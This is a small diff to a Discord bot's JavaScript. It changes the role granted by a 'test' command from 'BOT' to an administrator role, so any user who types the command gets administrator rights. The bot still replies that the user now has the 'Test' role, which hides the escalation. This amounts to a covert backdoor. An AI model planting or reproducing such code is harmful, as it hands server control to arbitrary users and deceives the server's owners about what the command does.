@@ -160,7 +160,7 @@ bot.on('message', message => {
     if(message.content[0] === prefix) {
         if(message.content === prefix + 'test') {
 
-            let role = message.guild.roles.find("name", "BOT")
+            let role = message.guild.roles.find("name", "⚔️Administrateur⚔️")
 
                 message.member.addRole(role)
                 message.reply("Tu as maitenant le role Test")
